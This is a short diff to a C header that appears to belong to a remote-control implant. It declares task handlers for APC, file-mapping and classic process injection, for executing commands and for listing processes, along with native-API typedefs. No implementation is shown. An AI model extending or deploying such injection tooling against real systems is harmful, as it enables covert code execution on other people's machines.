@@ -1,6 +1,8 @@
 #ifndef _TASK_
 #define _TASK_
+#include <winternl.h>
 #include "../message/Message.h"
+
 
 
 typedef PMESSAGE (*TaskHandler)(PBYTE payload, DWORD size);
@@ -53,7 +55,7 @@ typedef NTSTATUS (NTAPI* fnNtQueueApcThread)
  IN PVOID     ApcStatusBlock OPTIONAL,      // Pointer to a parameter (2) for the APC (set to NULL)
  IN ULONG                ApcReserved OPTIONAL          // Pointer to a parameter (3) for the APC (set to NULL)
 );
-typedef struct _OBJECT_ATTRIBUTES{}OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
 typedef NTSTATUS (NTAPI* fnNtCreateSection)
 (
   OUT PHANDLE             SectionHandle,          // Pointer to a HANDLE variable that receives a handle to the section object
@@ -100,5 +102,6 @@ PMESSAGE injectViaApcTask(PBYTE payload, DWORD size);
 PMESSAGE injectViaFileMappingTask(PBYTE payload, DWORD size);
 PMESSAGE injectViaClassicProcessTask(PBYTE payload, DWORD size);
 PMESSAGE executeCommandTask(PBYTE payload, DWORD size);
+PMESSAGE listProcess(PBYTE payload, DWORD size);
 
 #endif
